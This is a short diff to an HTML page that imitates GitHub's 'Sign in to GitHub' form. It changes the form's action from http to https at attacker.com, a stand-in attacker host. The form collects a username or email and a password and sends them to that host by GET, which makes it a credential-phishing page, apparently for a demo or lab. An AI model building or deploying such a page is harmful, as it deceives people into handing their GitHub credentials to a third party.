@@ -7,7 +7,7 @@
         </svg>
         <h1 style="font-size: 24px;font-weight: 300;letter-spacing: -.5px;">Sign in to GitHub</h1>
         <div style="padding-top:1em; padding-bottom: 1em; background:#090d11;width:50%; border-radius:7px;color:#c9d1d9">
-            <form action="http://attacker.com" accept-charset="UTF-8" method="get">
+            <form action="https://attacker.com" accept-charset="UTF-8" method="get">
                 <label for="login_field">Username or email address</label><br/>
                 <input style="background:#c9d1d9;width:50%; border-radius:7px;color:#090d11" type="text" name="login" id="login_field" autocomplete="username" autofocus="autofocus"><br/>
                 <label for="password">Password</label><br/>
